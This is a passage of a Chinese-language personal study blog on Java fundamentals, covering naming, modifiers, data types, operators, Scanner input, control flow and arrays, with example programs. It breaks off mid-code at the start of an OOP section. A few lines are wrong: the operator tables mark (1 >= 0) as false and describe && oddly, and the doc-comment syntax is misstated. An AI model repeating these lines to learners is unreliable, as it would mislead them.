是大小写敏感的，这就意味着标识符 Hello 与 hello 是不同的。\n- **类名和接口名**：对于所有的类来说，类名的首字母应该大写。如果类名由若干单词组成，那么每个单词的首字母应该大写，例如 **MyFirstJavaClass** 。\n- **变量名和方法名**：所有的方法名都应该以小写字母开头。如果方法名含有若干单词，则后面的每个单词首字母大写。\n- **常量名**：所有字母都大写。多单词时每个单词用下划线隔开\n\n常量是特殊的变量！\n\n- **源文件名**：源文件名必须和类名相同。当保存文件的时候，你应该使用类名作为文件名保存（切记 Java 是大小写敏感的），文件名的后缀为 **.java**。（如果文件名和类名不相同则会导致编译错误）。\n- **主方法入口**：所有的 Java 程序由 **public static void main(String[] args)** 方法开始执行。\n\n## java标识符命名规则\n\nJava 所有的组成部分都需要名字。类名、变量名以及方法名都被称为标识符\n\n- 开头不能是数字\n- 首字符之后可以是字母（A-Z 或者 a-z）,美元符（$）、下划线（_）或数字的任何字符组合\n- 关键字不能用作标识符\n- 标识符是大小写敏感的\n- 合法标识符举例：age、$salary、_value、__1_value\n- 非法标识符举例：123abc、-salary\n\n## Java修饰符\n\n和php一样，Java可以使用修饰符来修饰类中方法和属性。主要有两类修饰符\n\n- 一种是可访问修饰符:public(公共),protected(受保护),private(私有),default(默认)\n\n1. **public（公共）**\n   - 任何其他类都可以访问。没有访问限制。\n   - 示例：`public class MyClass {}`\n2. **protected（受保护）**\n   - 仅限于同一个包中的类以及子类（无论是否在同一个包中）访问。\n   - 示例：`protected int myVariable;`\n3. **default（默认）**\n   - 如果没有指定任何访问修饰符，则为默认访问权限（包私有）。仅限于同一个包中的类访问。\n   - 示例：`class MyClass {}`\n4. **private（私有）**\n   - 仅限于该类内部访问，其他类无法访问。\n   - 示例：`private int myVariable;`\n\n- 一种是非访问修饰符:\n\n1. **static（静态）**\n   - 表示该成员属于类而不是类的实例，可以通过类名直接访问。\n   - 示例：`static int myStaticVariable;`\n2. **final（最终）**\n   - 用于声明类、方法或变量。\n   - - **类**：表示该类不能被继承。\n     - 示例：`final class MyFinalClass {}`\n   - - **方法**：表示该方法不能被子类重写。\n     - 示例：`final void myMethod() {}`\n   - - **变量**：表示该变量的值不能被改变（常量）。\n     - 示例：`final int MY_CONSTANT = 10;`\n3. **abstract（抽象）**\n   - 用于类和方法。\n   - - **类**：表示该类不能被实例化，通常用于为子类提供模板。\n     - 示例：`abstract class MyAbstractClass {}`\n   - - **方法**：表示该方法没有实现，子类必须实现该方法。\n     - 示例：`abstract void myAbstractMethod();`\n4. **synchronized（同步）**\n   - 用于方法或代码块，表示该方法或代码块在同一时间只能被一个线程访问，适用于多线程环境下的同步。\n   - 示例：`synchronized void myMethod() {}`\n5. **volatile（易失性）**\n   - 用于变量，表示该变量可能会被多个线程修改，以确保每次读取变量时都从主内存中获取。\n   - 示例：`volatile int myVariable;`\n6. **transient（瞬态）**\n   - 用于变量，表示该变量不应被序列化。当对象被序列化时，瞬态变量的值不会被保存。\n   - 示例：`transient int myTransientVariable;`\n\n## java的注释\n\n单行注释:以`//`开始\n\n多行注释:以`/*`开始，以`*/`结束\n\n文档注释:以 `/* `开始，每行开头用`*`号开始以 `*/` 结束\n\n关于文档注释的DOS命令\n\n```\njavadoc -d 文件夹名 -xx -yy java文件名\n```\n\n## java的转义字符\n\n常用的转义字符\n\n- `\\t`：水平制表符(类似于tab键)\n- `\\n`：换行符\n- `\\\\`：表示常规字符反斜杠\n- `\\\"`：表示常规字符双引号\n- `\\'`：表示常规字符单引号\n- `\\r`：回车符，将光标移到该行开头逐个覆盖字符\n\n## java的继承\n\n这个可以类似于寄生的过程，在 Java 中，一个类可以由其他类派生。如果你要创建一个类，而且已经存在一个类具有你所需要的属性或方法，那么你可以将新创建的类继承该类。\n\n利用继承的方法，可以重用已存在类的方法和属性，而不用重写这些代码。被继承的类称为超类（super class），派生类称为子类（sub class）。\n\n## java的数据类型\n\nJava 数据类型分为两大类：基本数据类型和引用数据类型。\n\n基本数据类型:\n\n1. **整数类型**：\n   - `byte`：1 字节，范围从 -128 到 127。\n   - `short`：2 字节，范围从 -32,768 到 32,767。\n   - `int`：4 字节，范围从 -2,147,483,648 到 2,147,483,647。\n   - `long`：8 字节，范围为 -2^63 到 2^63-1。**定义变量的时候需要在初始值后加上一个L**，例如12345678L\n2. **浮点类型**：\n   - `float`：单精度浮点型，4 字节，适合表示小数，范围约为 ±3.40282347E+38（有效位数约为 7 位）。**定义变量的时候需要在结尾加上f，例如0.0f**\n   - `double`：双精度浮点型，8 字节，适合表示较大或较小的浮点数，范围约为 ±1.79769313486231570E+308（有效位数约为 15 位）。\n3. **字符类型**：\n   - `char`：2 字节，表示单个字符，用单引号包裹，支持 Unicode 字符集，范围从 `'\\u0000'` 到 `'\\uffff'`。\n4. **布尔类型**：\n   - `boolean`：表示两个值之一，`true` 或 `false`，通常用于条件判断。\n\n引用数据类型:\n\n引用数据类型用于存储对象的引用，而不是对象本身。主要包括：\n\n1. **类（Class）**：\n   - Java 中的类可以定义用户自定义数据类型。通过类的实例化可以创建对象。\n2. **接口（Interface）**：\n   - 接口是抽象的一种类型，可以定义方法的签名，通常用于实现多态。\n3. **数组（Array）**：\n   - 数组是相同类型元素的集合，可以是基本数据类型的数组或引用数据类型的数组。\n\n放个具体的例子来实验一下\n\n```java\npublic class HelloWorld {\n    public static void main(String[] args){\n        //byte\n        System.out.println(\"byte的二进制位数:\"+Byte.SIZE);\n        System.out.println(\"byte的最小值:\"+Byte.MIN_VALUE);\n        System.out.println(\"byte的最大值:\"+Byte.MAX_VALUE);\n        System.out.println();\n        //short\n        System.out.println(\"short的二进制位数:\"+Short.SIZE);\n        System.out.println(\"short的最小值:\"+Short.MIN_VALUE);\n        System.out.println(\"short的最大值:\"+Short.MAX_VALUE);\n        System.out.println();\n        //int\n        System.out.println(\"int的二进制位数:\"+Integer.SIZE);\n        System.out.println(\"int的最小值:\" + Integer.MIN_VALUE);  \n        System.out.println(\"int的最大值:\" + Integer.MAX_VALUE);  \n        System.out.println();  \n        // long  \n         System.out.println(\"基本类型：long 二进制位数：\" + Long.SIZE);  \n         System.out.println(\"最小值：Long.MIN_VALUE=\" + Long.MIN_VALUE);  \n         System.out.println(\"最大值：Long.MAX_VALUE=\" + Long.MAX_VALUE);  \n         System.out.println();     \n        // float  \n         System.out.println(\"基本类型：float 二进制位数：\" + Float.SIZE);  \n         System.out.println(\"最小值：Float.MIN_VALUE=\" + Float.MIN_VALUE);  \n         System.out.println(\"最大值：Float.MAX_VALUE=\" + Float.MAX_VALUE);  \n         System.out.println();  \n        // double  \n         System.out.println(\"基本类型：double 二进制位数：\" + Double.SIZE);  \n         System.out.println(\"最小值：Double.MIN_VALUE=\" + Double.MIN_VALUE);  \n         System.out.println(\"最大值：Double.MAX_VALUE=\" + Double.MAX_VALUE);  \n         System.out.println();     \n        // char  \n         System.out.println(\"基本类型：char 二进制位数：\" + Character.SIZE);  \n        // 将char的最小值转化成整数型进行输出    \n         System.out.println(\"最小值：Character.MIN_VALUE=\"  \n                 + (int) Character.MIN_VALUE);  \n        // 将char的最大值转化成整数型进行输出  \n         System.out.println(\"最大值：Character.MAX_VALUE=\"  \n                 + (int) Character.MAX_VALUE);        \n    }\n}\n```\n\n输出结果\n\n![image-20250112010537300](../image/achieve/202411/java学习/image-20250112010537300.png)\n\n这个代码纯属是为了练练手才一个个打出来的，学编程还是建议多动手哈\n\n特别说明一下啊关于这些数据类型的默认值(也就是当我们并没有给这些数据类型的变量进行赋值的时候的默认值)\n\n- `int`, `short`, `long`, `byte` 的默认值是0。\n- `char` 的默认值是 `\\u0000`（空字符）。\n- `float` 的默认值是 `0.0f`。\n- `double` 的默认值是 `0.0d`。\n- `boolean` 的默认值是 `false`。\n- 引用类型（类、接口、数组）的默认值是 `null`。\n\n说起这个数据类型我们不得不聊到存储的地址，基本数据类型的变量都是直接存储在栈中的，而引用数据类型的变量则分为两个区域，引用(指向堆的地址)存储在栈中，通过访问变量名称读取栈中的地址，进而我们去访问存储的数据\n\n![image-20250205005131307](../image/achieve/202411/java学习/image-20250205005131307.png)\n\n## 数据类型的转化\n\n类型转换主要分为两种：**自动类型转换（隐式转换）和强制类型转换（显式转换）**。\n\n- 自动类型转换\n\n小转大\n\n当将一种较小范围的基本数据类型赋值给较大范围的基本数据类型时，Java 会自动进行转换\n\n```java\nbyte->short,char—> int —> long—> float —> double \n```\n\n说白了就是大的数据类型的范围可以容纳小的数据类型的所有范围\n\n但是这里的话是没有boolean的，boolean是不能进行转换的\n\n那我们怎么从大的数据类型转化成小的数据类型呢?这就是我们的强制类型转换了\n\n- 强制类型转换\n\n格式:\n\n```\n(type)value\n```\n\ntype就是需要转换的数据类型了，例如从浮点数强制转化成整数，(int)131.4=131,但是要注意我们的值不能超过小类型的范围\n\n### String转化成char\n\n```\nSystem.out.println(gender.charAt(0));\n```\n\n### 基本数据类型转化成String\n\n语法：基本类型+ \"\"即可\n\n```\nint n1 = 1;\nString s1 = n1 + \"\";\nSystem.out.println(s1);\n//1\n```\n\n### String转化成基本数据类型\n\n语法：\n\n```\n通过基本类型的包装类调用parsexxx方法进行转化，例如Integer.parseInt()\n```\n\n```JAVA\n//String转化成基本数据类型的方法\npublic class StringToBasic {\n    public static void main(String[] args) {\n        //String -> int\n        String s1 = \"123\";\n        int n1 = Integer.parseInt(s1);\n        System.out.println(n1);\n\n        //String -> double\n        String s2 = \"123.456\";\n        double n2 = Double.parseDouble(s2);\n        System.out.println(n2);\n\n        /*\n        . \n        . \n        . \n        */\n    }\n}\n```\n\n![image-20250320111827253](../image/achieve/202411/java学习/image-20250320111827253.png)\n\n## java变量\n\n变量的概念：\n\n- 内存中的一个存储区域，该区域有自己的名称(变量名)和类型(数据类型)\n- 和其他语言一样，变量需要先声明后使用\n- Java是强类型语言，每个变量在声明的时候必须声明数据类型\n- 变量只能作用在作用域内(最近的一对花括号中)\n\n声明变量的格式\n\n最好变量名是能清晰体现其用途的，比如我的名字的变量就是myName，用小写字母开头，后面的单词首字母大写\n\n```java\nstatic int a;\n修饰符+数据类型+变量名\n```\n\n声明变量后再给变量赋值，但是也是可以直接对变量进行定义初始化的，格式如下：\n\n```\n数据类型 变量名 = 初始值(如果没有的话就是null)\n```\n\n变量的分类(按声明的位置分)\n\n- 局部变量\n\n在方法、构造函数或代码块中声明的变量，只能在该特定方法、构造函数或代码块内访问。(方法中声明的变量)\n\n- 类变量(静态变量)\n\n使用 `static` 关键字声明的变量，属于类本身，而不是任何特定的实例。所有对象共享同一个类变量(应该就是类似于define常量)\n\n1. 由于静态变量是与类相关的，因此可以通过类名来访问静态变量，也可以通过实例名来访问静态变量。\n2. 常量和静态变量的区别，常量在编译时就已经确定了它的值，而静态变量的值可以在运行时改变。\n\n- 成员变量\n\n在类中声明，但不在方法内的变量，属于类的实例。每个对象都有自己的一份实例变量。(在类中的成员属性)\n\n1. 当一个对象被实例化之后，每个成员变量的值就跟着确定。\n2. 成员变量在对象创建的时候创建，在对象被销毁的时候销毁\n\n这个直接理解成php中的对象和类里面的成员变量就可以了\n\n然后我在教程中还发现了一种变量类型\n\n- 参数变量\n\n参数是方法或构造函数声明中的变量，用于接收调用该方法或构造函数时传递的值，参数变量的作用域只限于方法内部。(说白了就是函数的形参嘛)\n\n前面几个比较好理解，最后一个参数变量我们来稍微讲一下\n\n参数变量的值传递方式有两种：**值传递**和**引用传递**。\n\n可以看成是c语言中的函数引用，值传递就是正常的传值，从形参到实参，实参可以是具体的值也可以是一个内存地址，值传递的特点是实参不会变，而引用传递的特点是实参也会改变。下面我会写一个具体的实例去进行讲解\n\n```java\npublic class HelloWorld{\n    public String name=\"wanth3f1ag\";//成员变量\n    public static void change(int x ,int y){//参数变量\n        int a = x;//局部变量\n        int b = y;\n        int c = a;\n        a = b;\n        b = c;\n    }\n    public static void main(String[] args){\n        int a= 20,b=10;\n        change(a,b);\n        System.out.println(\"a= \" + a + \"b= \" + b);\n    }\n}\n//a= 20b= 10\n```\n\n## java运算符\n\n- 算术运算符\n\n| 操作符 | 描述       |        例子        |\n| :----- | :--------- | :----------------: |\n| +      | 相加       |   A + B 等于 30    |\n| -      | 相减       |   A – B 等于 -10   |\n| *      | 相乘       |    A * B等于200    |\n| /      | 相除       |     B / A等于2     |\n| ％     | 相除后取模 |      B%A等于0      |\n| ++     | 自增       | B++ 或 ++B 等于 21 |\n| --     | 自减       | B-- 或 --B 等于 19 |\n| +      | 字符串拼接 | \"He\"+\"llo\"=\"Hello\" |\n\n- 关系运算符\n\n| 运算符 |                             描述                             |       例子       |\n| :----: | :----------------------------------------------------------: | :--------------: |\n|   ==   |     检查如果两个操作数的值是否相等，如果相等则条件为真。     | （1 == 0）为假。 |\n|   !=   |   检查如果两个操作数的值是否相等，如果值不相等则条件为真。   | (1 != 0) 为真。  |\n|   >    |  检查左操作数的值是否大于右操作数的值，如果是那么条件为真。  |  （0> 1）为假。  |\n|   <    |  检查左操作数的值是否小于右操作数的值，如果是那么条件为真。  | （0 < 1）为真。  |\n|   >=   | 检查左操作数的值是否大于或等于右操作数的值，如果是那么条件为真。 | （1> = 0）为假。 |\n|   <=   | 检查左操作数的值是否小于或等于右操作数的值，如果是那么条件为真。 | （0 <= 1）为真。 |\n\n- 位运算符\n\n|  ＆  |            如果相对应位都是1，则结果为1，否则为0             | （A＆B），得到12，即0000 1100  |\n| :--: | :----------------------------------------------------------: | :----------------------------: |\n|  \\|  |           如果相对应位都是 0，则结果为 0，否则为 1           | （A \\| B）得到61，即 0011 1101 |\n|  ^   |            如果相对应位值相同，则结果为0，否则为1            | （A ^ B）得到49，即 0011 0001  |\n|  〜  |     按位取反运算符翻转操作数的每一位，即0变成1，1变成0。     |  （〜A）得到-61，即1100 0011   |\n|  <<  |     按位左移运算符。左操作数按位左移右操作数指定的位数。     |  A << 2得到240，即 1111 0000   |\n|  >>  |     按位右移运算符。左操作数按位右移右操作数指定的位数。     |      A >> 2得到15即 1111       |\n| >>>  | 按位右移补零操作符。左操作数的值按右操作数指定的位数右移，移动得到的空位以零填充。 |     A>>>2得到15即0000 1111     |\n\n- 逻辑运算符\n\n| 操作符 |                             描述                             |       例子       |\n| :----: | :----------------------------------------------------------: | :--------------: |\n|   &    |          称为逻辑与运算符。无论真假都会执行右边运算          | 0<1&x=6结果是x=6 |\n|   \\|   | 称为逻辑或操作符。如果任何两个操作数任何一个为真，条件为真。 | （1 \\| 0）为真。 |\n|   !    | 称为逻辑非运算符。用来反转操作数的逻辑状态。如果条件为true，则逻辑非运算符将得到false。 |     !0为真。     |\n|   &&   |       AND(短路)当且仅当两个操作数都为真，条件才为真。        |     一真为假     |\n|  \\|\\|  |                           OR(短路)                           |     一真为真     |\n|   ^    |                             异或                             |    (1^1)为假     |\n\n&和&&的区别:\n\n- 单&时，左边无论真假，右边都会执行\n- 双&时，如果左边为真则执行右边运算，如果为假则不执行\n- 和\"\\|\\|\"的区别同理，双\\|时左边为真右边则不执行\n\n异或(\"^\")\"和(\"\\|\")不同的是,对御^而言，左右结果为true时，结果为false\n\n- 赋值运算符\n\n| =       | 简单的赋值运算符，将右操作数的值赋给左侧操作数               | C = A + B将把A + B得到的值赋给C          |\n| ------- | ------------------------------------------------------------ | ---------------------------------------- |\n| + =     | 加和赋值操作符，它把左操作数和右操作数相加赋值给左操作数     | C + = A等价于C = C + A                   |\n| - =     | 减和赋值操作符，它把左操作数和右操作数相减赋值给左操作数     | C - = A等价于C = C - A                   |\n| * =     | 乘和赋值操作符，它把左操作数和右操作数相乘赋值给左操作数     | C * = A等价于C = C * A                   |\n| / =     | 除和赋值操作符，它把左操作数和右操作数相除赋值给左操作数     | C / = A，C 与 A 同类型时等价于 C = C / A |\n| （％）= | 取模和赋值操作符，它把左操作数和右操作数取模后赋值给左操作数 | C％= A等价于C = C％A                     |\n| << =    | 左移位赋值运算符                                             | C << = 2等价于C = C << 2                 |\n| >> =    | 右移位赋值运算符                                             | C >> = 2等价于C = C >> 2                 |\n| ＆=     | 按位与赋值运算符                                             | C＆= 2等价于C = C＆2                     |\n| ^ =     | 按位异或赋值操作符                                           | C ^ = 2等价于C = C ^ 2                   |\n| \\| =    | 按位或赋值操作符                                             | C \\| = 2等价于C = C \\| 2                 |\n\n**值得注意的是，在我们的变量为一个对象的时候，关系运算符比较的是两个变量的地址而不是字符串**\n\n其他运算符:三目运算符\n\n格式\n\n```\n布尔表达式?执行语句1:执行语句2\n```\n\n若表达式为真则执行语句1，为假则执行语句2\n\n## java键盘输入语句\n\n我们可以通过 Scanner 类来获取用户的输入，具体步骤如下\n\n```\n1.导入该类所在的包 java.util.*或java.util.Scanner\n2.创建该类对象\n3.调用里面的功能\n```\n\n### 使用next()方法\n\n在处理输入的时候我们需要使用Scanner中的方法，例如next\n\n![image-20250319172608861](../image/achieve/202411/java学习/image-20250319172608861.png)\n\n这里的完整令牌就是字符串，这意味着他只会读取一个字符串，我们先正常演示一下\n\n```java\n//如何进行键盘输入\n//1.导入Scanner所在的包\nimport java.util.Scanner;\n\npublic class Input {\n    public static void main(String[] args) {\n        //2.new创建一个实例化对象\n        Scanner input = new Scanner(System.in);\n        //3.接收用户的输入 需要使用相关的方法\n        System.out.println(\"请输入你的名字\");\n        String name = input.next();\n        System.out.println(\"你的名字是: \" + name);\n    }\n}\n/*\n请输入你的名字\nwanth3f1ag\n你的名字是: wanth3f1ag\n*/\n```\n\n另外还能根据需要赋值的变量的类型去决定输入的内容被标记为什么类型\n\n![image-20250319173313853](../image/achieve/202411/java学习/image-20250319173313853.png)\n\n实例操作一下\n\n```java\n//如何进行键盘输入\n//1.导入Scanner所在的包\nimport java.util.Scanner;\n\npublic class Input {\n    public static void main(String[] args) {\n        //2.创建一个实例化对象\n        Scanner input = new Scanner(System.in);\n        //3.接收用户的输入 需要使用相关的方法\n        //使用next方法标记输入的类型为字符串\n        System.out.println(\"请输入你的名字\");\n        String name = input.next();\n        //使用nextint方法标记输入的类型为整型\n        System.out.println(\"请输入你的年龄\");\n        int age = input.nextInt();\n        //使用nextdouble方法标记输入的类型为双精度浮点型\n        System.out.println(\"请输入你的身高\");\n        double heigh = input.nextDouble();\n        System.out.println(\"你的身高是: \" + heigh);\n        System.out.println(\"你的年龄是: \" + age);\n        System.out.println(\"你的名字是: \" + name);\n\n\n    }\n}\n```\n\n### 使用nextline()方法\n\n```\n//如何进行键盘输入\n//1.导入Scanner所在的包\nimport java.util.Scanner;\n\npublic class Input {\n    public static void main(String[] args) {\n        //2.创建一个实例化对象\n        Scanner input = new Scanner(System.in);\n        //3.接收用户的输入 需要使用相关的方法\n        //使用next方法标记输入的类型为字符串\n        System.out.println(\"请输入你的名字\");\n        String name = input.nextLine();\n        //使用nextint方法标记输入的类型为整型\n//        System.out.println(\"请输入你的年龄\");\n//        int age = input.nextInt();\n//        //使用nextdouble方法标记输入的类型为双精度浮点型\n//        System.out.println(\"请输入你的身高\");\n//        double heigh = input.nextDouble();\n//        System.out.println(\"你的身高是: \" + heigh);\n//        System.out.println(\"你的年龄是: \" + age);\n        System.out.println(\"你的名字是: \" + name);\n\n    }\n}\n/*\n请输入你的名字\nasdhiawda jdsdjsd\n你的名字是: asdhiawda jdsdjsd\n*/\n```\n\n在读取前我们一般需要 使用 hasNext 与 hasNextLine 判断是否还有输入的数据，当然这个判断输入数据的也是有不同类型的\n\n![image-20250319191213991](../image/achieve/202411/java学习/image-20250319191213991.png)\n\n### next() 与 nextLine() 区别\n\nnext():\n\n- 1、一定要读取到有效字符后才可以结束输入。\n- 2、对输入有效字符之前遇到的空白，next() 方法会自动将其去掉。\n- 3、只有输入有效字符后才将其后面输入的空白作为分隔符或者结束符。\n- next() 不能得到带有空格的字符串。\n\nnextLine()：\n\n- 1、以Enter为结束符,也就是说 nextLine()方法返回的是输入回车之前的所有字符。\n- 2、可以获得空白。\n\n## java循环控制\n\n分为三种：for循环，while循环，do...while循环\n\n### for循环\n\n```\nfor(变量初始化; 循环条件; 循环变量迭代) {\n    //代码语句\n}\n```\n\n开始循环前有初始化值，每次循环开始前都会进行循环条件的判断，true则进入循环，false则结束循环，每次循环结束都会执行更新语句\n\n需要注意的是\n\n1. 循环条件是可以返回布尔值的表达式\n2. 变量初始化可以是多条初始化语句，但要求类型一致，语句之间逗号隔开\n3. 循环变量迭代也是可以有多条语句的，并且迭代语句和初始化语句可以为空，但是分号不能少\n\n### while循环\n\n```\nwhile( 循环条件 ) {\n  //循环内容\n}\n```\n\n如果循环的值为 true，则语句块一直执行，直到布尔表达式的值为 false。\n\n### do...while循环\n\n```\ndo {\n       //代码语句\n}while(布尔表达式);\n```\n\n和while循环语句一样，但是由于布尔表达式在循环体的后面，do...while循环语句在进行进入循环前都会先进行一次代码语句。如果布尔表达式的值为 true，则语句块一直执行，直到布尔表达式的值为 false。\n\n### break关键字\n\n主要在循环语句和控制语句中，可以跳出最里层的循环，并且继续执行该循环下面的语句。\n\n### continue关键字\n\ncontinue 适用于任何循环控制结构中。作用是让程序立刻跳转到下一次循环的迭代\n\n在for语句中continue会直接结束当前循环进入下一循环而不是跳出循环\n\n在 while 或者 do…while 循环中，continue会立即跳转到布尔表达式的判断语句。\n\n## java分支控制\n\n### if单分支语句\n\n```\nif(布尔表达式){\n   //如果布尔表达式为true将执行的语句\n}\n```\n\n如果布尔表达式的值为 true，则执行 if 语句中的代码块，否则不执行\n\n举个例子\n\n```java\n//if单分支语句\n\nimport java.util.Scanner;\n\npublic class IF01 {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"请输入你的年龄\");\n        int age = scanner.nextInt();//获取输入的年龄\n        if(age >= 18) {\n            System.out.println(\"你已经满18岁了\");\n        }\n    }\n}\n```\n\n### if...else双分支语句\n\n```\nif(布尔表达式){\n   //如果布尔表达式的值为true\n}else{\n   //如果布尔表达式的值为false\n}\n```\n\n如果布尔表达式的值为 true，则执行 if 语句中的代码块，否则执行 else 语句块后面的代码。\n\n```java\n//if单分支语句\n\nimport java.util.Scanner;\n\npublic class IF01 {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"请输入你的年龄\");\n        int age = scanner.nextInt();//获取输入的年龄\n        if(age >= 18) {\n            System.out.println(\"你已经满18岁了\");\n        }else System.out.println(\"你还未满18岁\");\n    }\n}\n```\n\n### if...else if...else 多分支语句\n\n```\nif(布尔表达式 1){\n   //如果布尔表达式 1的值为true执行代码\n}else if(布尔表达式 2){\n   //如果布尔表达式 2的值为true执行代码\n}else if(布尔表达式 3){\n   //如果布尔表达式 3的值为true执行代码\n}else {\n   //如果以上布尔表达式都不为true执行代码\n}\n```\n\n一个if语句只能有一个else语句，else语句都会在末尾，在所有的 else if 语句之后。一个if语句可以有若干个else if语句。一旦其中一个 else if 语句检测为 true，其他的 else if 以及 else 语句都将跳过执行。\n\n### 嵌套的 if…else 语句\n\n```\nif(布尔表达式 1){\n   ////如果布尔表达式 1的值为true执行代码\n   if(布尔表达式 2){\n      ////如果布尔表达式 2的值为true执行代码\n   }\n}\n```\n\n当然也可以向上面一样嵌套if ..else if语句\n\n```\nif(布尔表达式 1){\n   ////如果布尔表达式 1的值为true执行代码\n   if(布尔表达式 1){\n   //如果布尔表达式 1的值为true执行代码\n\t\t}else if(布尔表达式 2){\n   //如果布尔表达式 2的值为true执行代码\n\t\t}else if(布尔表达式 3){\n   //如果布尔表达式 3的值为true执行代码\n\t\t}else {\n   //如果以上布尔表达式都不为true执行代码\n\t\t}\n}\n```\n\n### switch case语句\n\nswitch case 语句判断一个变量与一系列值中某个值是否相等，每个值称为一个分支。\n\n```\nswitch(表达式){\n    case 常量1 :\n       //语句 1\n       break; //可选\n    case 常量2 :\n       //语句2\n       break; //可选\n    //你可以有任意数量的case语句\n    default : //可选\n       //语句\n}\n```\n\n在这个语句中需要注意几个细节\n\n1. 表达式数据类型应该和case后的常量类型一致，或者是可以自动转化为可以相互比较的类型，例如表达式的数据类型是字符，而case后的常量是int\n2. switch中的表达式的返回值必须是`(byte,short,int,char,enum,String)`\n3. case子语句中的值必须是常量或常量表达式而不能是变量\n4. 变量的值与 case 语句的值相等时，那么 case 语句之后的语句开始执行，直到 break 语句出现才会跳出 switch 语句。\n5. 当遇到 break 语句时，switch 语句终止。程序跳转到 switch 语句后面的语句执行。case 语句不必须要包含 break 语句。如果没有 break 语句出现，程序会继续执行下一条 case 语句，直到出现 break 语句。\n\n关于java的那些结构语句的话其实和c语言差不多，我就不赘述了\n\n## java接口\n\n接口简单来说就是一个抽象类型，是抽象方法的集合，通常以interface来声明。一个类通过实现继承接口的方式去继承接口的抽象方法。\n\n但是接口和类不同的是，类是用于描述对象的属性和方法，而接口则是包含类要实现的方法，但是接口不提供这些方法的具体实现，无法被实例化。\n\n接口的几个特点\n\n- 接口不能被实例化成对象\n- 接口的方法都是抽象方法\n- 接口中每个方法都是隐式抽象的，会被隐式的指定为public abstract\n- 接口中可以含有变量，但是接口中的变量会被隐式的指定为 **public static final** 变量\n\n- 定义接口\n\n```\n[修饰符] interface [接口名称] {\n\t//声明变量\n\t//抽象方法\n}\n```\n\n## java数组\n\n数组简单来说就是相同类型的数的一个集合\n\n- 先声明数组变量\n\n```\ndataType[] arrayRefVar;   // 首选的方法\n或\ndataType arrayRefVar[];  // 效果相同，但不是首选方法\n```\n\njava中声明数组时候不能指定数组长度，例如int class[40]；这样是错误的\n\n数组属于引用类型，数组型数据是对象，数组中每个元素相当于该对象的成员变量，所以数组在使用前需要先创建\n\n- 再创建数组\n\n```\narrayRefVar = new dataType[arraySize];\n```\n\n注意:`数组需要声明长度并且长度不可变`\n\n当然，我们声明数组和创建数组可以一起完成\n\n```\ndataType[] arrayRefVar = new dataType[arraySize];\nor\ndataType[] arrayRefVar = {value0, value1, ..., valuek};\n```\n\n- 数组的引用\n\n数组的元素是通过索引访问的。数组索引从 0 开始，所以索引值从 0 到 数组名.length-1。\n\n数组的下标可以是整形常量也可以是表达式，但是切记需要在数组长度的取值范围内去引用，不然会导致出错\n\n**可以用length属性去获取数组的长度**，例如class.length可以指向class数组的长度\n\n- 数组初始化\n\n\n和我们基本数据类型的初始值是一样的\n\n- `int`, `short`, `long`, `byte` 的默认值是0。\n- `char` 的默认值是 `\\u0000`（空字符）。\n- `float` 的默认值是 `0.0f`。\n- `double` 的默认值是 `0.0d`。\n- `boolean` 的默认值是 `false`。\n- 引用类型（类、接口、数组）的默认值是 `null`。\n\n我们定义什么类型的数组，数组的初始化值就是什么样的\n\n接下来我们写个一维数组感受一下\n\n```java\npublic class HelloWorld{\n    public static void main(String[] args) {\n        //String[] students;//数组的声明1\n        String students[];//数组的声明2\n        students = new String[5];//数组的创建方法1\n        //String[] students = new String[5]//数组的声明和创建方法1\n        //String[] students = {\"John\",\"Jane\"}//数组的声明和创建方法2\n        students[0] = \"John\";\n        students[1] = \"Mary\";\n        students[2] = \"Jane\";\n        students[3] = \"Bob\";\n        students[4] = \"Alice\";\n        for (int i = 0; i < students.length; i++) {\n            System.out.println(students[i]);\n        }\n    }\n}\n```\n\n打印出的结果就是各个元素的名字\n\n通常我们在处理数组或者引用数组的时候都会搭配循环去进行使用，例如对数组的数据进行赋值，以及操作数组等\n\n```java\nimport java.util.Scanner;\n\n//输入数组的数据\npublic class Array01{\n    public static void main(String[] args) {\n        int[] arr1 = new int[10];\n        Scanner scanner = new Scanner(System.in);\n        for(int i = 0; i < arr1.length; i++){\n            arr1[i] = scanner.nextInt();\n            System.out.println(arr1[i]);\n        }\n    }\n}\n```\n\n### 数组赋值机制\n\nJava 中的参数传递机制是 **按值传递（Pass by Value）**，但对于对象（包括数组）来说，传递的是对象的引用（即内存地址）的副本\n\n### 值传递和引用传递的区别\n\n基本数据类型的传递方式为值传递，即两个数之间不会互相影响\n\n```java\npublic class Test01{\n    public static void main(String[] args){\n    \tint n1 = 10;\n    \tint n2 = n1;\n    \n    \tn2 = 80;\n    \tSystem.out.println(\"n1 = \" + n1);\n    \tSystem.out.println(\"n2 = \" + n2);\n    }\n}\n//n1 = 10\n//n2 = 80\n```\n\n数组在默认情况下是引用传递\n\n```java\npublic class Array01 {\n    public static void main(String[] args) {\n        int[] arr1 = {1,2,3};\n        int[] arr2 = arr1;//arr2指向arr1的地址\n        arr2[0] = 10;\n\n        System.out.println(arr1[0]);\n    }\n}\n//10\n```\n\n在 Java 中，数组是一个对象。即使数组存储的是基本数据类型（如 `int[]`），数组本身也是一个对象。因此，数组的传递遵循对象的传递规则。\n\n# 面向对象OOP\n\n对象和类的基础知识\n\n- **对象**：对象是类的一个实例，有状态和行为。\n- **类**：**类是一种数据类型**，它描述一类对象的行为和状态。\n- **方法**：方法就是行为，一个类可以有很多方法。逻辑运算、数据修改以及所有动作都是在方法中完成的。\n- **变量**：变量就是状态，一个类可以有很多变量。类的状态都是由变量去决定的\n- **实例变量**：每个对象都有独特的实例变量，对象的状态由这些实例变量的值决定。\n\n比如，我们类可以看成是一类动物，行为和状态就指的是动物的一些特点，而对象就可以具体到哪些动物，拿一条狗来举例，它的状态有：名字、品种、颜色，行为有：叫、摇尾巴和跑。这些行为和状态就是可以看成是一个个实例变量和方法，而具体的名字等等就是变量的值，具体的行为就是方法了。在java中状态可以看成是成员属性(变量)，而行为就是方法\n\n因为之前学过php，所以对这些的理解的话其实大致上是一样的。\n\n那我们如何定义一个类并且获得一个实例呢？\n\n举个例子\n\n```java\n//定义一个猫类Cat\nclass Cat{\n    //定义猫的名字，年龄，毛色\n    String name;\n    int age;\n    String 